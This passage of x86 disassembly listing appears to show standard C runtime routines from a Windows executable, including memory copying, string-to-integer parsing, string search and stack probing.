  406060:	89 44 8f fc          	mov    %eax,-0x4(%edi,%ecx,4)
  406064:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  40606b:	03 f0                	add    %eax,%esi
  40606d:	03 f8                	add    %eax,%edi
  40606f:	ff 24 95 78 60 40 00 	jmp    *0x406078(,%edx,4)
  406076:	8b ff                	mov    %edi,%edi
  406078:	88 60 40             	mov    %ah,0x40(%eax)
  40607b:	00 90 60 40 00 9c    	add    %dl,-0x63ffbfa0(%eax)
  406081:	60                   	pusha
  406082:	40                   	inc    %eax
  406083:	00 b0 60 40 00 8b    	add    %dh,-0x74ffbfa0(%eax)
  406089:	45                   	inc    %ebp
  40608a:	08 5e 5f             	or     %bl,0x5f(%esi)
  40608d:	c9                   	leave
  40608e:	c3                   	ret
  40608f:	90                   	nop
  406090:	8a 06                	mov    (%esi),%al
  406092:	88 07                	mov    %al,(%edi)
  406094:	8b 45 08             	mov    0x8(%ebp),%eax
  406097:	5e                   	pop    %esi
  406098:	5f                   	pop    %edi
  406099:	c9                   	leave
  40609a:	c3                   	ret
  40609b:	90                   	nop
  40609c:	8a 06                	mov    (%esi),%al
  40609e:	88 07                	mov    %al,(%edi)
  4060a0:	8a 46 01             	mov    0x1(%esi),%al
  4060a3:	88 47 01             	mov    %al,0x1(%edi)
  4060a6:	8b 45 08             	mov    0x8(%ebp),%eax
  4060a9:	5e                   	pop    %esi
  4060aa:	5f                   	pop    %edi
  4060ab:	c9                   	leave
  4060ac:	c3                   	ret
  4060ad:	8d 49 00             	lea    0x0(%ecx),%ecx
  4060b0:	8a 06                	mov    (%esi),%al
  4060b2:	88 07                	mov    %al,(%edi)
  4060b4:	8a 46 01             	mov    0x1(%esi),%al
  4060b7:	88 47 01             	mov    %al,0x1(%edi)
  4060ba:	8a 46 02             	mov    0x2(%esi),%al
  4060bd:	88 47 02             	mov    %al,0x2(%edi)
  4060c0:	8b 45 08             	mov    0x8(%ebp),%eax
  4060c3:	5e                   	pop    %esi
  4060c4:	5f                   	pop    %edi
  4060c5:	c9                   	leave
  4060c6:	c3                   	ret
  4060c7:	90                   	nop
  4060c8:	8d 74 31 fc          	lea    -0x4(%ecx,%esi,1),%esi
  4060cc:	8d 7c 39 fc          	lea    -0x4(%ecx,%edi,1),%edi
  4060d0:	f7 c7 03 00 00 00    	test   $0x3,%edi
  4060d6:	75 24                	jne    0x4060fc
  4060d8:	c1 e9 02             	shr    $0x2,%ecx
  4060db:	83 e2 03             	and    $0x3,%edx
  4060de:	83 f9 08             	cmp    $0x8,%ecx
  4060e1:	72 0d                	jb     0x4060f0
  4060e3:	fd                   	std
  4060e4:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4060e6:	fc                   	cld
  4060e7:	ff 24 95 10 62 40 00 	jmp    *0x406210(,%edx,4)
  4060ee:	8b ff                	mov    %edi,%edi
  4060f0:	f7 d9                	neg    %ecx
  4060f2:	ff 24 8d c0 61 40 00 	jmp    *0x4061c0(,%ecx,4)
  4060f9:	8d 49 00             	lea    0x0(%ecx),%ecx
  4060fc:	8b c7                	mov    %edi,%eax
  4060fe:	ba 03 00 00 00       	mov    $0x3,%edx
  406103:	83 f9 04             	cmp    $0x4,%ecx
  406106:	72 0c                	jb     0x406114
  406108:	83 e0 03             	and    $0x3,%eax
  40610b:	2b c8                	sub    %eax,%ecx
  40610d:	ff 24 85 18 61 40 00 	jmp    *0x406118(,%eax,4)
  406114:	ff 24 8d 10 62 40 00 	jmp    *0x406210(,%ecx,4)
  40611b:	90                   	nop
  40611c:	28 61 40             	sub    %ah,0x40(%ecx)
  40611f:	00 48 61             	add    %cl,0x61(%eax)
  406122:	40                   	inc    %eax
  406123:	00 70 61             	add    %dh,0x61(%eax)
  406126:	40                   	inc    %eax
  406127:	00 8a 46 03 23 d1    	add    %cl,-0x2edcfcba(%edx)
  40612d:	88 47 03             	mov    %al,0x3(%edi)
  406130:	4e                   	dec    %esi
  406131:	c1 e9 02             	shr    $0x2,%ecx
  406134:	4f                   	dec    %edi
  406135:	83 f9 08             	cmp    $0x8,%ecx
  406138:	72 b6                	jb     0x4060f0
  40613a:	fd                   	std
  40613b:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40613d:	fc                   	cld
  40613e:	ff 24 95 10 62 40 00 	jmp    *0x406210(,%edx,4)
  406145:	8d 49 00             	lea    0x0(%ecx),%ecx
  406148:	8a 46 03             	mov    0x3(%esi),%al
  40614b:	23 d1                	and    %ecx,%edx
  40614d:	88 47 03             	mov    %al,0x3(%edi)
  406150:	8a 46 02             	mov    0x2(%esi),%al
  406153:	c1 e9 02             	shr    $0x2,%ecx
  406156:	88 47 02             	mov    %al,0x2(%edi)
  406159:	83 ee 02             	sub    $0x2,%esi
  40615c:	83 ef 02             	sub    $0x2,%edi
  40615f:	83 f9 08             	cmp    $0x8,%ecx
  406162:	72 8c                	jb     0x4060f0
  406164:	fd                   	std
  406165:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  406167:	fc                   	cld
  406168:	ff 24 95 10 62 40 00 	jmp    *0x406210(,%edx,4)
  40616f:	90                   	nop
  406170:	8a 46 03             	mov    0x3(%esi),%al
  406173:	23 d1                	and    %ecx,%edx
  406175:	88 47 03             	mov    %al,0x3(%edi)
  406178:	8a 46 02             	mov    0x2(%esi),%al
  40617b:	88 47 02             	mov    %al,0x2(%edi)
  40617e:	8a 46 01             	mov    0x1(%esi),%al
  406181:	c1 e9 02             	shr    $0x2,%ecx
  406184:	88 47 01             	mov    %al,0x1(%edi)
  406187:	83 ee 03             	sub    $0x3,%esi
  40618a:	83 ef 03             	sub    $0x3,%edi
  40618d:	83 f9 08             	cmp    $0x8,%ecx
  406190:	0f 82 5a ff ff ff    	jb     0x4060f0
  406196:	fd                   	std
  406197:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  406199:	fc                   	cld
  40619a:	ff 24 95 10 62 40 00 	jmp    *0x406210(,%edx,4)
  4061a1:	8d 49 00             	lea    0x0(%ecx),%ecx
  4061a4:	c4 61 40             	les    0x40(%ecx),%esp
  4061a7:	00 cc                	add    %cl,%ah
  4061a9:	61                   	popa
  4061aa:	40                   	inc    %eax
  4061ab:	00 d4                	add    %dl,%ah
  4061ad:	61                   	popa
  4061ae:	40                   	inc    %eax
  4061af:	00 dc                	add    %bl,%ah
  4061b1:	61                   	popa
  4061b2:	40                   	inc    %eax
  4061b3:	00 e4                	add    %ah,%ah
  4061b5:	61                   	popa
  4061b6:	40                   	inc    %eax
  4061b7:	00 ec                	add    %ch,%ah
  4061b9:	61                   	popa
  4061ba:	40                   	inc    %eax
  4061bb:	00 f4                	add    %dh,%ah
  4061bd:	61                   	popa
  4061be:	40                   	inc    %eax
  4061bf:	00 07                	add    %al,(%edi)
  4061c1:	62 40 00             	bound  %eax,0x0(%eax)
  4061c4:	8b 44 8e 1c          	mov    0x1c(%esi,%ecx,4),%eax
  4061c8:	89 44 8f 1c          	mov    %eax,0x1c(%edi,%ecx,4)
  4061cc:	8b 44 8e 18          	mov    0x18(%esi,%ecx,4),%eax
  4061d0:	89 44 8f 18          	mov    %eax,0x18(%edi,%ecx,4)
  4061d4:	8b 44 8e 14          	mov    0x14(%esi,%ecx,4),%eax
  4061d8:	89 44 8f 14          	mov    %eax,0x14(%edi,%ecx,4)
  4061dc:	8b 44 8e 10          	mov    0x10(%esi,%ecx,4),%eax
  4061e0:	89 44 8f 10          	mov    %eax,0x10(%edi,%ecx,4)
  4061e4:	8b 44 8e 0c          	mov    0xc(%esi,%ecx,4),%eax
  4061e8:	89 44 8f 0c          	mov    %eax,0xc(%edi,%ecx,4)
  4061ec:	8b 44 8e 08          	mov    0x8(%esi,%ecx,4),%eax
  4061f0:	89 44 8f 08          	mov    %eax,0x8(%edi,%ecx,4)
  4061f4:	8b 44 8e 04          	mov    0x4(%esi,%ecx,4),%eax
  4061f8:	89 44 8f 04          	mov    %eax,0x4(%edi,%ecx,4)
  4061fc:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  406203:	03 f0                	add    %eax,%esi
  406205:	03 f8                	add    %eax,%edi
  406207:	ff 24 95 10 62 40 00 	jmp    *0x406210(,%edx,4)
  40620e:	8b ff                	mov    %edi,%edi
  406210:	20 62 40             	and    %ah,0x40(%edx)
  406213:	00 28                	add    %ch,(%eax)
  406215:	62 40 00             	bound  %eax,0x0(%eax)
  406218:	38 62 40             	cmp    %ah,0x40(%edx)
  40621b:	00 4c 62 40          	add    %cl,0x40(%edx,%eiz,2)
  40621f:	00 8b 45 08 5e 5f    	add    %cl,0x5f5e0845(%ebx)
  406225:	c9                   	leave
  406226:	c3                   	ret
  406227:	90                   	nop
  406228:	8a 46 03             	mov    0x3(%esi),%al
  40622b:	88 47 03             	mov    %al,0x3(%edi)
  40622e:	8b 45 08             	mov    0x8(%ebp),%eax
  406231:	5e                   	pop    %esi
  406232:	5f                   	pop    %edi
  406233:	c9                   	leave
  406234:	c3                   	ret
  406235:	8d 49 00             	lea    0x0(%ecx),%ecx
  406238:	8a 46 03             	mov    0x3(%esi),%al
  40623b:	88 47 03             	mov    %al,0x3(%edi)
  40623e:	8a 46 02             	mov    0x2(%esi),%al
  406241:	88 47 02             	mov    %al,0x2(%edi)
  406244:	8b 45 08             	mov    0x8(%ebp),%eax
  406247:	5e                   	pop    %esi
  406248:	5f                   	pop    %edi
  406249:	c9                   	leave
  40624a:	c3                   	ret
  40624b:	90                   	nop
  40624c:	8a 46 03             	mov    0x3(%esi),%al
  40624f:	88 47 03             	mov    %al,0x3(%edi)
  406252:	8a 46 02             	mov    0x2(%esi),%al
  406255:	88 47 02             	mov    %al,0x2(%edi)
  406258:	8a 46 01             	mov    0x1(%esi),%al
  40625b:	88 47 01             	mov    %al,0x1(%edi)
  40625e:	8b 45 08             	mov    0x8(%ebp),%eax
  406261:	5e                   	pop    %esi
  406262:	5f                   	pop    %edi
  406263:	c9                   	leave
  406264:	c3                   	ret
  406265:	6a 00                	push   $0x0
  406267:	ff 74 24 10          	push   0x10(%esp)
  40626b:	ff 74 24 10          	push   0x10(%esp)
  40626f:	ff 74 24 10          	push   0x10(%esp)
  406273:	e8 04 00 00 00       	call   0x40627c
  406278:	83 c4 10             	add    $0x10,%esp
  40627b:	c3                   	ret
  40627c:	55                   	push   %ebp
  40627d:	8b ec                	mov    %esp,%ebp
  40627f:	83 ec 0c             	sub    $0xc,%esp
  406282:	53                   	push   %ebx
  406283:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  406287:	56                   	push   %esi
  406288:	57                   	push   %edi
  406289:	8b 7d 08             	mov    0x8(%ebp),%edi
  40628c:	8a 1f                	mov    (%edi),%bl
  40628e:	8d 77 01             	lea    0x1(%edi),%esi
  406291:	89 75 fc             	mov    %esi,-0x4(%ebp)
  406294:	83 3d 00 bb 40 00 01 	cmpl   $0x1,0x40bb00
  40629b:	7e 0f                	jle    0x4062ac
  40629d:	0f b6 c3             	movzbl %bl,%eax
  4062a0:	6a 08                	push   $0x8
  4062a2:	50                   	push   %eax
  4062a3:	e8 5d 10 00 00       	call   0x407305
  4062a8:	59                   	pop    %ecx
  4062a9:	59                   	pop    %ecx
  4062aa:	eb 0f                	jmp    0x4062bb
  4062ac:	8b 0d 58 96 40 00    	mov    0x409658,%ecx
  4062b2:	0f b6 c3             	movzbl %bl,%eax
  4062b5:	8a 04 41             	mov    (%ecx,%eax,2),%al
  4062b8:	83 e0 08             	and    $0x8,%eax
  4062bb:	85 c0                	test   %eax,%eax
  4062bd:	74 05                	je     0x4062c4
  4062bf:	8a 1e                	mov    (%esi),%bl
  4062c1:	46                   	inc    %esi
  4062c2:	eb d0                	jmp    0x406294
  4062c4:	80 fb 2d             	cmp    $0x2d,%bl
  4062c7:	89 75 fc             	mov    %esi,-0x4(%ebp)
  4062ca:	75 06                	jne    0x4062d2
  4062cc:	83 4d 14 02          	orl    $0x2,0x14(%ebp)
  4062d0:	eb 05                	jmp    0x4062d7
  4062d2:	80 fb 2b             	cmp    $0x2b,%bl
  4062d5:	75 06                	jne    0x4062dd
  4062d7:	8a 1e                	mov    (%esi),%bl
  4062d9:	46                   	inc    %esi
  4062da:	89 75 fc             	mov    %esi,-0x4(%ebp)
  4062dd:	8b 45 10             	mov    0x10(%ebp),%eax
  4062e0:	85 c0                	test   %eax,%eax
  4062e2:	0f 8c 8c 01 00 00    	jl     0x406474
  4062e8:	83 f8 01             	cmp    $0x1,%eax
  4062eb:	0f 84 83 01 00 00    	je     0x406474
  4062f1:	83 f8 24             	cmp    $0x24,%eax
  4062f4:	0f 8f 7a 01 00 00    	jg     0x406474
  4062fa:	6a 10                	push   $0x10
  4062fc:	85 c0                	test   %eax,%eax
  4062fe:	59                   	pop    %ecx
  4062ff:	75 24                	jne    0x406325
  406301:	80 fb 30             	cmp    $0x30,%bl
  406304:	74 09                	je     0x40630f
  406306:	c7 45 10 0a 00 00 00 	movl   $0xa,0x10(%ebp)
  40630d:	eb 32                	jmp    0x406341
  40630f:	8a 06                	mov    (%esi),%al
  406311:	3c 78                	cmp    $0x78,%al
  406313:	74 0d                	je     0x406322
  406315:	3c 58                	cmp    $0x58,%al
  406317:	74 09                	je     0x406322
  406319:	c7 45 10 08 00 00 00 	movl   $0x8,0x10(%ebp)
  406320:	eb 1f                	jmp    0x406341
  406322:	89 4d 10             	mov    %ecx,0x10(%ebp)
  406325:	39 4d 10             	cmp    %ecx,0x10(%ebp)
  406328:	75 17                	jne    0x406341
  40632a:	80 fb 30             	cmp    $0x30,%bl
  40632d:	75 12                	jne    0x406341
  40632f:	8a 06                	mov    (%esi),%al
  406331:	3c 78                	cmp    $0x78,%al
  406333:	74 04                	je     0x406339
  406335:	3c 58                	cmp    $0x58,%al
  406337:	75 08                	jne    0x406341
  406339:	8a 5e 01             	mov    0x1(%esi),%bl
  40633c:	46                   	inc    %esi
  40633d:	46                   	inc    %esi
  40633e:	89 75 fc             	mov    %esi,-0x4(%ebp)
  406341:	83 c8 ff             	or     $0xffffffff,%eax
  406344:	33 d2                	xor    %edx,%edx
  406346:	f7 75 10             	divl   0x10(%ebp)
  406349:	bf 03 01 00 00       	mov    $0x103,%edi
  40634e:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406351:	83 3d 00 bb 40 00 01 	cmpl   $0x1,0x40bb00
  406358:	0f b6 f3             	movzbl %bl,%esi
  40635b:	7e 0c                	jle    0x406369
  40635d:	6a 04                	push   $0x4
  40635f:	56                   	push   %esi
  406360:	e8 a0 0f 00 00       	call   0x407305
  406365:	59                   	pop    %ecx
  406366:	59                   	pop    %ecx
  406367:	eb 0b                	jmp    0x406374
  406369:	a1 58 96 40 00       	mov    0x409658,%eax
  40636e:	8a 04 70             	mov    (%eax,%esi,2),%al
  406371:	83 e0 04             	and    $0x4,%eax
  406374:	85 c0                	test   %eax,%eax
  406376:	74 08                	je     0x406380
  406378:	0f be cb             	movsbl %bl,%ecx
  40637b:	83 e9 30             	sub    $0x30,%ecx
  40637e:	eb 32                	jmp    0x4063b2
  406380:	83 3d 00 bb 40 00 01 	cmpl   $0x1,0x40bb00
  406387:	7e 0b                	jle    0x406394
  406389:	57                   	push   %edi
  40638a:	56                   	push   %esi
  40638b:	e8 75 0f 00 00       	call   0x407305
  406390:	59                   	pop    %ecx
  406391:	59                   	pop    %ecx
  406392:	eb 0b                	jmp    0x40639f
  406394:	a1 58 96 40 00       	mov    0x409658,%eax
  406399:	66 8b 04 70          	mov    (%eax,%esi,2),%ax
  40639d:	23 c7                	and    %edi,%eax
  40639f:	85 c0                	test   %eax,%eax
  4063a1:	74 4a                	je     0x4063ed
  4063a3:	0f be c3             	movsbl %bl,%eax
  4063a6:	50                   	push   %eax
  4063a7:	e8 8d 0e 00 00       	call   0x407239
  4063ac:	59                   	pop    %ecx
  4063ad:	8b c8                	mov    %eax,%ecx
  4063af:	83 e9 37             	sub    $0x37,%ecx
  4063b2:	3b 4d 10             	cmp    0x10(%ebp),%ecx
  4063b5:	73 36                	jae    0x4063ed
  4063b7:	8b 75 f8             	mov    -0x8(%ebp),%esi
  4063ba:	83 4d 14 08          	orl    $0x8,0x14(%ebp)
  4063be:	3b 75 f4             	cmp    -0xc(%ebp),%esi
  4063c1:	72 14                	jb     0x4063d7
  4063c3:	75 0c                	jne    0x4063d1
  4063c5:	83 c8 ff             	or     $0xffffffff,%eax
  4063c8:	33 d2                	xor    %edx,%edx
  4063ca:	f7 75 10             	divl   0x10(%ebp)
  4063cd:	3b ca                	cmp    %edx,%ecx
  4063cf:	76 06                	jbe    0x4063d7
  4063d1:	83 4d 14 04          	orl    $0x4,0x14(%ebp)
  4063d5:	eb 09                	jmp    0x4063e0
  4063d7:	0f af 75 10          	imul   0x10(%ebp),%esi
  4063db:	03 f1                	add    %ecx,%esi
  4063dd:	89 75 f8             	mov    %esi,-0x8(%ebp)
  4063e0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4063e3:	ff 45 fc             	incl   -0x4(%ebp)
  4063e6:	8a 18                	mov    (%eax),%bl
  4063e8:	e9 64 ff ff ff       	jmp    0x406351
  4063ed:	8b 4d 14             	mov    0x14(%ebp),%ecx
  4063f0:	ff 4d fc             	decl   -0x4(%ebp)
  4063f3:	8b 55 0c             	mov    0xc(%ebp),%edx
  4063f6:	f6 c1 08             	test   $0x8,%cl
  4063f9:	75 10                	jne    0x40640b
  4063fb:	85 d2                	test   %edx,%edx
  4063fd:	74 06                	je     0x406405
  4063ff:	8b 45 08             	mov    0x8(%ebp),%eax
  406402:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406405:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  406409:	eb 4d                	jmp    0x406458
  40640b:	f6 c1 04             	test   $0x4,%cl
  40640e:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  406413:	75 1c                	jne    0x406431
  406415:	f6 c1 01             	test   $0x1,%cl
  406418:	75 3e                	jne    0x406458
  40641a:	83 e1 02             	and    $0x2,%ecx
  40641d:	74 09                	je     0x406428
  40641f:	81 7d f8 00 00 00 80 	cmpl   $0x80000000,-0x8(%ebp)
  406426:	77 09                	ja     0x406431
  406428:	85 c9                	test   %ecx,%ecx
  40642a:	75 2c                	jne    0x406458
  40642c:	39 45 f8             	cmp    %eax,-0x8(%ebp)
  40642f:	76 27                	jbe    0x406458
  406431:	f6 45 14 01          	testb  $0x1,0x14(%ebp)
  406435:	c7 05 e4 bd 40 00 22 	movl   $0x22,0x40bde4
  40643c:	00 00 00 
  40643f:	74 06                	je     0x406447
  406441:	83 4d f8 ff          	orl    $0xffffffff,-0x8(%ebp)
  406445:	eb 11                	jmp    0x406458
  406447:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40644a:	80 e1 02             	and    $0x2,%cl
  40644d:	f6 d9                	neg    %cl
  40644f:	1b c9                	sbb    %ecx,%ecx
  406451:	f7 d9                	neg    %ecx
  406453:	03 c8                	add    %eax,%ecx
  406455:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  406458:	85 d2                	test   %edx,%edx
  40645a:	74 05                	je     0x406461
  40645c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40645f:	89 02                	mov    %eax,(%edx)
  406461:	f6 45 14 02          	testb  $0x2,0x14(%ebp)
  406465:	74 08                	je     0x40646f
  406467:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40646a:	f7 d8                	neg    %eax
  40646c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40646f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406472:	eb 0b                	jmp    0x40647f
  406474:	8b 45 0c             	mov    0xc(%ebp),%eax
  406477:	85 c0                	test   %eax,%eax
  406479:	74 02                	je     0x40647d
  40647b:	89 38                	mov    %edi,(%eax)
  40647d:	33 c0                	xor    %eax,%eax
  40647f:	5f                   	pop    %edi
  406480:	5e                   	pop    %esi
  406481:	5b                   	pop    %ebx
  406482:	c9                   	leave
  406483:	c3                   	ret
  406484:	cc                   	int3
  406485:	cc                   	int3
  406486:	cc                   	int3
  406487:	cc                   	int3
  406488:	cc                   	int3
  406489:	cc                   	int3
  40648a:	cc                   	int3
  40648b:	cc                   	int3
  40648c:	cc                   	int3
  40648d:	cc                   	int3
  40648e:	cc                   	int3
  40648f:	cc                   	int3
  406490:	8d 42 ff             	lea    -0x1(%edx),%eax
  406493:	5b                   	pop    %ebx
  406494:	c3                   	ret
  406495:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40649c:	8d 64 24 00          	lea    0x0(%esp),%esp
  4064a0:	33 c0                	xor    %eax,%eax
  4064a2:	8a 44 24 08          	mov    0x8(%esp),%al
  4064a6:	53                   	push   %ebx
  4064a7:	8b d8                	mov    %eax,%ebx
  4064a9:	c1 e0 08             	shl    $0x8,%eax
  4064ac:	8b 54 24 08          	mov    0x8(%esp),%edx
  4064b0:	f7 c2 03 00 00 00    	test   $0x3,%edx
  4064b6:	74 13                	je     0x4064cb
  4064b8:	8a 0a                	mov    (%edx),%cl
  4064ba:	42                   	inc    %edx
  4064bb:	38 d9                	cmp    %bl,%cl
  4064bd:	74 d1                	je     0x406490
  4064bf:	84 c9                	test   %cl,%cl
  4064c1:	74 51                	je     0x406514
  4064c3:	f7 c2 03 00 00 00    	test   $0x3,%edx
  4064c9:	75 ed                	jne    0x4064b8
  4064cb:	0b d8                	or     %eax,%ebx
  4064cd:	57                   	push   %edi
  4064ce:	8b c3                	mov    %ebx,%eax
  4064d0:	c1 e3 10             	shl    $0x10,%ebx
  4064d3:	56                   	push   %esi
  4064d4:	0b d8                	or     %eax,%ebx
  4064d6:	8b 0a                	mov    (%edx),%ecx
  4064d8:	bf ff fe fe 7e       	mov    $0x7efefeff,%edi
  4064dd:	8b c1                	mov    %ecx,%eax
  4064df:	8b f7                	mov    %edi,%esi
  4064e1:	33 cb                	xor    %ebx,%ecx
  4064e3:	03 f0                	add    %eax,%esi
  4064e5:	03 f9                	add    %ecx,%edi
  4064e7:	83 f1 ff             	xor    $0xffffffff,%ecx
  4064ea:	83 f0 ff             	xor    $0xffffffff,%eax
  4064ed:	33 cf                	xor    %edi,%ecx
  4064ef:	33 c6                	xor    %esi,%eax
  4064f1:	83 c2 04             	add    $0x4,%edx
  4064f4:	81 e1 00 01 01 81    	and    $0x81010100,%ecx
  4064fa:	75 1c                	jne    0x406518
  4064fc:	25 00 01 01 81       	and    $0x81010100,%eax
  406501:	74 d3                	je     0x4064d6
  406503:	25 00 01 01 01       	and    $0x1010100,%eax
  406508:	75 08                	jne    0x406512
  40650a:	81 e6 00 00 00 80    	and    $0x80000000,%esi
  406510:	75 c4                	jne    0x4064d6
  406512:	5e                   	pop    %esi
  406513:	5f                   	pop    %edi
  406514:	5b                   	pop    %ebx
  406515:	33 c0                	xor    %eax,%eax
  406517:	c3                   	ret
  406518:	8b 42 fc             	mov    -0x4(%edx),%eax
  40651b:	38 d8                	cmp    %bl,%al
  40651d:	74 36                	je     0x406555
  40651f:	84 c0                	test   %al,%al
  406521:	74 ef                	je     0x406512
  406523:	38 dc                	cmp    %bl,%ah
  406525:	74 27                	je     0x40654e
  406527:	84 e4                	test   %ah,%ah
  406529:	74 e7                	je     0x406512
  40652b:	c1 e8 10             	shr    $0x10,%eax
  40652e:	38 d8                	cmp    %bl,%al
  406530:	74 15                	je     0x406547
  406532:	84 c0                	test   %al,%al
  406534:	74 dc                	je     0x406512
  406536:	38 dc                	cmp    %bl,%ah
  406538:	74 06                	je     0x406540
  40653a:	84 e4                	test   %ah,%ah
  40653c:	74 d4                	je     0x406512
  40653e:	eb 96                	jmp    0x4064d6
  406540:	5e                   	pop    %esi
  406541:	5f                   	pop    %edi
  406542:	8d 42 ff             	lea    -0x1(%edx),%eax
  406545:	5b                   	pop    %ebx
  406546:	c3                   	ret
  406547:	8d 42 fe             	lea    -0x2(%edx),%eax
  40654a:	5e                   	pop    %esi
  40654b:	5f                   	pop    %edi
  40654c:	5b                   	pop    %ebx
  40654d:	c3                   	ret
  40654e:	8d 42 fd             	lea    -0x3(%edx),%eax
  406551:	5e                   	pop    %esi
  406552:	5f                   	pop    %edi
  406553:	5b                   	pop    %ebx
  406554:	c3                   	ret
  406555:	8d 42 fc             	lea    -0x4(%edx),%eax
  406558:	5e                   	pop    %esi
  406559:	5f                   	pop    %edi
  40655a:	5b                   	pop    %ebx
  40655b:	c3                   	ret
  40655c:	cc                   	int3
  40655d:	cc                   	int3
  40655e:	cc                   	int3
  40655f:	cc                   	int3
  406560:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  406564:	57                   	push   %edi
  406565:	53                   	push   %ebx
  406566:	56                   	push   %esi
  406567:	8a 11                	mov    (%ecx),%dl
  406569:	8b 7c 24 10          	mov    0x10(%esp),%edi
  40656d:	84 d2                	test   %dl,%dl
  40656f:	74 69                	je     0x4065da
  406571:	8a 71 01             	mov    0x1(%ecx),%dh
  406574:	84 f6                	test   %dh,%dh
  406576:	74 4f                	je     0x4065c7
  406578:	8b f7                	mov    %edi,%esi
  40657a:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  40657e:	8a 07                	mov    (%edi),%al
  406580:	46                   	inc    %esi
  406581:	38 d0                	cmp    %dl,%al
  406583:	74 15                	je     0x40659a
  406585:	84 c0                	test   %al,%al
  406587:	74 0b                	je     0x406594
  406589:	8a 06                	mov    (%esi),%al
  40658b:	46                   	inc    %esi
  40658c:	38 d0                	cmp    %dl,%al
  40658e:	74 0a                	je     0x40659a
  406590:	84 c0                	test   %al,%al
  406592:	75 f5                	jne    0x406589
  406594:	5e                   	pop    %esi
  406595:	5b                   	pop    %ebx
  406596:	5f                   	pop    %edi
  406597:	33 c0                	xor    %eax,%eax
  406599:	c3                   	ret
  40659a:	8a 06                	mov    (%esi),%al
  40659c:	46                   	inc    %esi
  40659d:	38 f0                	cmp    %dh,%al
  40659f:	75 eb                	jne    0x40658c
  4065a1:	8d 7e ff             	lea    -0x1(%esi),%edi
  4065a4:	8a 61 02             	mov    0x2(%ecx),%ah
  4065a7:	84 e4                	test   %ah,%ah
  4065a9:	74 28                	je     0x4065d3
  4065ab:	8a 06                	mov    (%esi),%al
  4065ad:	83 c6 02             	add    $0x2,%esi
  4065b0:	38 e0                	cmp    %ah,%al
  4065b2:	75 c4                	jne    0x406578
  4065b4:	8a 41 03             	mov    0x3(%ecx),%al
  4065b7:	84 c0                	test   %al,%al
  4065b9:	74 18                	je     0x4065d3
  4065bb:	8a 66 ff             	mov    -0x1(%esi),%ah
  4065be:	83 c1 02             	add    $0x2,%ecx
  4065c1:	38 e0                	cmp    %ah,%al
  4065c3:	74 df                	je     0x4065a4
  4065c5:	eb b1                	jmp    0x406578
  4065c7:	33 c0                	xor    %eax,%eax
  4065c9:	5e                   	pop    %esi
  4065ca:	5b                   	pop    %ebx
  4065cb:	5f                   	pop    %edi
  4065cc:	8a c2                	mov    %dl,%al
  4065ce:	e9 d3 fe ff ff       	jmp    0x4064a6
  4065d3:	8d 47 ff             	lea    -0x1(%edi),%eax
  4065d6:	5e                   	pop    %esi
  4065d7:	5b                   	pop    %ebx
  4065d8:	5f                   	pop    %edi
  4065d9:	c3                   	ret
  4065da:	8b c7                	mov    %edi,%eax
  4065dc:	5e                   	pop    %esi
  4065dd:	5b                   	pop    %ebx
  4065de:	5f                   	pop    %edi
  4065df:	c3                   	ret
  4065e0:	51                   	push   %ecx
  4065e1:	3d 00 10 00 00       	cmp    $0x1000,%eax
  4065e6:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  4065ea:	72 14                	jb     0x406600
  4065ec:	81 e9 00 10 00 00    	sub    $0x1000,%ecx
  4065f2:	2d 00 10 00 00       	sub    $0x1000,%eax
  4065f7:	85 01                	test   %eax,(%ecx)
  4065f9:	3d 00 10 00 00       	cmp    $0x1000,%eax
  4065fe:	73 ec                	jae    0x4065ec
  406600:	2b c8                	sub    %eax,%ecx
  406602:	8b c4                	mov    %esp,%eax
  406604:	85 01                	test   %eax,(%ecx)
  406606:	8b e1                	mov    %ecx,%esp
  406608:	8b 08                	mov    (%eax),%ecx
  40660a:	8b 40 04             	mov    0x4(%eax),%eax
  40660d:	50                   	push   %eax
  40660e:	c3                   	ret
  40660f:	53                   	push   %ebx
  406610:	33 db                	xor    %ebx,%ebx
  406612:	39 1d 4c bf 40 00    	cmp    %ebx,0x40bf4c
  406618:	56                   	push   %esi
  406619:	57                   	push   %edi
  40661a:	75 42                	jne    0x40665e
  40661c:	68 d0 84 40 00       	push   $0x4084d0
  406621:	ff 15 38 80 40 00    	call   *0x408038
  406627:	8b f8                	mov    %eax,%edi
  406629:	3b fb                	cmp    %ebx,%edi
  40662b:	74 67                	je     0x406694
  40662d:	8b 35 3c 80 40 00    	mov    0x40803c,%esi
  406633:	68 c4 84 40 00       	push   $0x4084c4
  406638:	57                   	push   %edi
  406639:	ff d6                	call   *%esi
  40663b:	85 c0                	test   %eax,%eax
  40663d:	a3 4c bf 40 00       	mov    %eax,0x40bf4c
  406642:	74 50                	je     0x406694
  406644:	68 b4 84 40 00       	push   $0x4084b4
  406649:	57                   	push   %edi
  40664a:	ff d6                	call   *%esi
  40664c:	68 a0 84 40 00       	push   $0x4084a0
  406651:	57                   	push   %edi
  406652:	a3 50 bf 40 00       	mov    %eax,0x40bf50
  406657:	ff d6                	call   *%esi
  406659:	a3 54 bf 40 00       	mov    %eax,0x40bf54
  40665e:	a1 50 bf 40 00       	mov    0x40bf50,%eax
  406663:	85 c0                	test   %eax,%eax
  406665:	74 16                	je     0x40667d
  406667:	ff d0                	call   *%eax
  406669:	8b d8                	mov    %eax,%ebx
  40666b:	85 db                	test   %ebx,%ebx
  40666d:	74 0e                	je     0x40667d
